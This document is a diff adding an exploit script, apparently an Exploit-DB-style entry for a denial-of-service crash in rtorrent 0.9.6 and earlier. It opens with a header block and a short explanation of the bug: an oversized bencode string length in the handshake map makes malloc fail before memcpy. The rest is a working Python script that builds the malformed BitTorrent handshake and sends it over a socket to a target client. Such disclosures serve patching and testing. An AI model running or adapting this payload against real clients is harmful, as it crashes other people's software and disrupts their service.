@@ -1,0 +1,40 @@
+# Exploit Title: rtorrent 0.9.6 - Denial of Service
+# Date: 2018-01-10
+# Exploit Author: ecx86
+# Vendor Homepage: http://rtorrent.net
+# Software Link: https://github.com/rakshasa/rtorrent/releases
+# Version: <= 0.9.6
+# Tested on: Debian GNU/Linux 9.4 (stretch)
+
+# This crash is due to a bad bencode parse of the handshake data map.
+# Specifically, by providing a massive length for a string, namely the key of a map entry,
+# malloc fails, returning 0, which is passed to a memcpy call that causes the segfault.
+# This can be triggered actively by sending the crash-triggering data to a seeding rtorrent
+# client, or when a downloading rtorrent client connects to a malicious peer.
+
+#!/usr/bin/env python
+import socket
+import struct
+
+crash = ''
+proto_name = 'BitTorrent protocol'
+crash += chr(len(proto_name)) + proto_name # magic
+crash += '00000000' # reserved extension bytes
+
+# sha1 hash of info dictionary
+# change this depending on your torrent
+crash += '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+
+crash += '00000000000000000000' # peer id
+
+msg = ''
+msg += struct.pack('<H', 20) # message type: extended
+msg += 'd99999999999999999999999999999999:' # payload
+
+crash += struct.pack('>I', len(msg))
+crash += msg
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('1.3.3.7', 6890))
+s.send(crash)
+s.close()
